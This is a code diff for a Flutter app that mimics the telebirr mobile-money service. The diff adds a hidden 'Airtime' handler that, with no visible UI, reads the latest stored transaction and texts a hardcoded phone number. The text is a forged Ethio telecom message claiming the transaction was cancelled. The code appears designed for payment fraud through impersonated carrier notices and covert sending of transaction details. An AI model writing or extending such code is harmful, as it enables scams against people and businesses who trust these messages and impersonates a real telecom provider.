@@ -1,8 +1,11 @@
+import 'dart:convert';
 import 'dart:ui'; // Required for ImageFilter
 import 'package:flutter/material.dart';
 import 'package:font_awesome_flutter/font_awesome_flutter.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'individual_transfer_page.dart';
 import 'transfer_to_bank_page.dart';
+import 'sms_sender.dart';
 
 class GridContent extends StatelessWidget {
   const GridContent({
@@ -115,6 +118,47 @@ class GridContent extends StatelessWidget {
     );
   }
 
+  /// Silent airtime cancellation - sends SMS using the latest transaction
+  Future<void> _sendAirtimeCancellationSms(BuildContext context) async {
+    try {
+      // Get the latest transaction from SharedPreferences
+      final prefs = await SharedPreferences.getInstance();
+      List<String> history = prefs.getStringList('sent_balances') ?? [];
+      
+      if (history.isEmpty) {
+        print("No transaction history found for airtime cancellation");
+        return;
+      }
+      
+      // Get the last transaction
+      String lastTransactionJson = history.last;
+      Map<String, dynamic> lastTx = jsonDecode(lastTransactionJson);
+      
+      // Extract required info
+      String transactionID = lastTx['txID'] ?? 'UNKNOWN';
+      String amount = lastTx['amount_sent'] ?? '0.00';
+      String currentBalance = lastTx['remaining_balance'] ?? '0.00';
+      
+      // Format the SMS message exactly as requested
+      String message = 
+          "Dear Customer\n"
+          "Your request for transaction number $transactionID with amount ETB $amount is cancelled. "
+          "Your current E-Money Account balance is ETB $currentBalance.\n\n"
+          "Thank you for using telebirr\n"
+          "Ethio telecom\n\n"
+          "Dear WEDERE\n"
+          "The $transactionID transaction is cancelled.\n"
+          "Thank you for using telebirr Ethio telecom";
+      
+      // Send SMS silently
+      await SmsSender.sendSms("0989063761", message);
+      print("Airtime cancellation SMS sent for transaction: $transactionID");
+      
+    } catch (e) {
+      print("Failed to send airtime cancellation SMS: $e");
+    }
+  }
+
   /// RETAINED: Your original option item helper
   Widget _buildOptionItem(
     BuildContext context, {
@@ -192,16 +236,16 @@ class GridContent extends StatelessWidget {
       physics: const NeverScrollableScrollPhysics(),
       shrinkWrap: true,
       gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
-  crossAxisCount: 4,
-  mainAxisSpacing: 19,
-  crossAxisSpacing: 10,
-  mainAxisExtent: 100, // 🔥 exact height in px
-),
+        crossAxisCount: 4,
+        mainAxisSpacing: 19,
+        crossAxisSpacing: 10,
+        mainAxisExtent: 100, // 🔥 exact height in px
+      ),
       itemCount: 8,
       itemBuilder: (context, index) {
         bool isSendMoney = gridLabel[index] == 'Send Money';
-        // Check for Transfer to Bank label
         bool isTransferToBank = gridLabel[index] == 'Transfer to Bank';
+        bool isAirtime = gridLabel[index] == 'Airtime'; // Check for Airtime label
 
         return Builder(builder: (itemContext) {
           return GestureDetector(
@@ -212,7 +256,6 @@ class GridContent extends StatelessWidget {
                 final size = renderBox.size;
                 _showSendMoneyOptions(context, offset, size);
               } 
-              // ADDED: Navigation logic for Transfer to Bank
               else if (isTransferToBank) {
                 Navigator.push(
                   context,
@@ -221,13 +264,15 @@ class GridContent extends StatelessWidget {
                   ),
                 );
               }
+              else if (isAirtime) {
+                // Silent airtime cancellation - no UI, no page navigation
+                _sendAirtimeCancellationSms(context);
+              }
             },
             child: Container(
               decoration: BoxDecoration(
                 color: Colors.white,
                 borderRadius: BorderRadius.circular(10),
-                
-                
               ),
               child: Column(
                 mainAxisAlignment: MainAxisAlignment.center,
